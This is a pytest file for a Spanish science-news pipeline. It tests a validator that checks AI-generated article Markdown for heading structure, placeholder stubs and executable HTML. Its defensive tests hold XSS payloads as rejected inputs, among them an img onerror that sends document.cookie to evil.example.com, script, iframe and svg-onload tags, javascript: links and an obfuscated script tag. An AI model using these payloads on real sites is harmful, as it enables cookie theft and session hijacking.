from __future__ import annotations

import pytest

from news_collector.components.editorial.ai_editor import (
    GeneratedArticleValidationError,
    _normalize_article_body_heading_levels,
    validate_generated_article_markdown,
)

ART_BODY_MIN_LENGTH = """
## Introducción

Este es un artículo de prueba con texto suficiente para pasar el umbral mínimo de palabras que exige el validador de artículos generados antes de la publicación en el frontend Astro del proyecto Noticiencias.

El artículo describe un hallazgo científico reciente que fue verificado por al menos dos laboratorios independientes, con resultados consistentes y un margen de error bien documentado en la publicación revisada por pares que apareció en Nature la semana pasada.

Los investigadores confirmaron que este descubrimiento cambia nuestra comprensión fundamental del mecanismo subyacente a este fenómeno natural, abriendo nuevas líneas de investigación para la próxima década.
"""


def test_validate_generated_article_markdown_rejects_placeholder_stub() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown("""
## Fuga del Código Fuente Completo de Claude Code CLI

El contenido fuente proporcionado para este artículo es ilegible y corrupto, impidiendo la elaboración de un texto que cumpla con los estándares de rigor científico.
""")

    assert excinfo.value.error_code == "editorial_placeholder_blocked"


def test_validate_generated_article_markdown_accepts_real_article_body() -> None:
    validate_generated_article_markdown("""
## Un error de empaquetado expone el interior de Claude Code

Anthropic publicó una versión del paquete de Claude Code para npm que incluía un archivo source map. Ese archivo permitió reconstruir casi todo el código TypeScript de la herramienta, algo especialmente sensible porque Claude Code se ha vuelto una de las interfaces más visibles para programar con modelos de IA en la terminal.

La filtración no expuso datos de clientes ni credenciales, según la propia empresa, pero sí abrió una ventana inusual a la arquitectura interna del producto. Investigadores y desarrolladores empezaron a revisar de inmediato módulos relacionados con memoria, verificación de contexto y herramientas conectadas al flujo de trabajo del agente.

El episodio muestra un riesgo operativo clásico en software moderno: un error de empaquetado puede convertir metadatos útiles para depurar en una fuga masiva de propiedad intelectual. También deja a potenciales atacantes con más pistas para estudiar la superficie de seguridad del producto y buscar puntos débiles en sus guardrails.
""")


def test_normalize_article_body_heading_levels_repairs_first_h3_and_later_skip() -> (
    None
):
    normalized = _normalize_article_body_heading_levels("""
### Apertura

Este párrafo introduce el problema y ofrece suficiente contexto para entender por qué la investigación resulta relevante incluso antes de entrar en la metodología específica del trabajo.

#### Qué hicieron los investigadores

El equipo combinó datos experimentales y simulaciones para reducir ambigüedades y separar con claridad lo que realmente observaron de las interpretaciones más tentativas.

```md
### Este heading dentro de código no debe cambiar
```
""").strip()

    assert "## Apertura" in normalized
    assert "### Qué hicieron los investigadores" in normalized
    assert "### Este heading dentro de código no debe cambiar" in normalized


def test_validate_generated_article_markdown_rejects_invalid_heading_hierarchy() -> (
    None
):
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown("""
### Apertura

Este artículo tiene texto suficiente para pasar el mínimo narrativo, pero arranca en un nivel de heading que omite el H2 esperado para el cuerpo del artículo. Eso lo vuelve incorrecto para publicación.

El segundo párrafo mantiene el contenido por encima del umbral mínimo para que el fallo observado corresponda al problema de jerarquía y no a una longitud insuficiente del texto publicado.
""")

    assert excinfo.value.error_code == "editorial_heading_structure_invalid"


def test_validate_generated_article_markdown_accepts_h2_h3_structure() -> None:
    validate_generated_article_markdown("""
## Apertura

La nueva medición sorprendió porque corrigió una idea que llevaba años repitiéndose en el campo y ofreció una explicación más directa del fenómeno observado en condiciones experimentales reales.

### Qué hicieron los investigadores

El equipo repitió el experimento con instrumentos mejor calibrados, comparó resultados independientes y documentó con detalle los límites del análisis para evitar conclusiones exageradas.

## Contexto científico

El hallazgo encaja con trabajos recientes que pedían revisar supuestos anteriores y ayuda a entender por qué estudios previos parecían contradictorios aunque partían de datos compatibles entre sí.
""")


# ---------------------------------------------------------------------------
# Executable-content guardrail tests (Plan 022)
# ---------------------------------------------------------------------------


def test_rejects_script_tag() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Título legítimo

{ART_BODY_MIN_LENGTH}

<script>alert('xss')</script>
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_iframe_tag() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Contexto

{ART_BODY_MIN_LENGTH}

<iframe src="https://evil.example.com"></iframe>
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_event_handler() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Título

{ART_BODY_MIN_LENGTH}

<img src="foto.jpg" onerror="fetch('https://evil.example.com/steal?'+document.cookie)">
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_javascript_url() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Título

{ART_BODY_MIN_LENGTH}

[Click aquí](javascript:alert(1))
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_object_tag() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Resumen

{ART_BODY_MIN_LENGTH}

<object data="evil.swf"></object>
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_embed_tag() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Análisis

{ART_BODY_MIN_LENGTH}

<embed src="evil.pdf">
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_accepts_code_example_in_fence() -> None:
    """A script tag inside a code fence is a legitimate code example."""
    validate_generated_article_markdown(f"""
## Investigación

{ART_BODY_MIN_LENGTH}

```html
<script src="analytics.js"></script>
```
""")


def test_rejects_svg_with_event_handler() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Visualización

{ART_BODY_MIN_LENGTH}

<svg onload="alert(1)"><circle r="10"/></svg>
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_rejects_onclick_attribute() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Hallazgos

{ART_BODY_MIN_LENGTH}

<div onclick="steal()">contenido</div>
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"


def test_accepts_html_without_executable_content() -> None:
    """Plain HTML tags like <b>, <em>, <a href='https://...'> are safe."""
    validate_generated_article_markdown(f"""
## Contexto

{ART_BODY_MIN_LENGTH}

Los investigadores usaron <strong>microscopía de alta resolución</strong> para observar
la estructura de las proteínas. <a href="https://doi.org/10.1234/example">El artículo
original</a> fue publicado en una revista revisada por pares.
""")


def test_rejects_whitespace_variant_script_tag() -> None:
    with pytest.raises(GeneratedArticleValidationError) as excinfo:
        validate_generated_article_markdown(f"""
## Análisis

{ART_BODY_MIN_LENGTH}

<  script  >alert('xss')<  /script  >
""")
    assert excinfo.value.error_code == "editorial_executable_content_blocked"
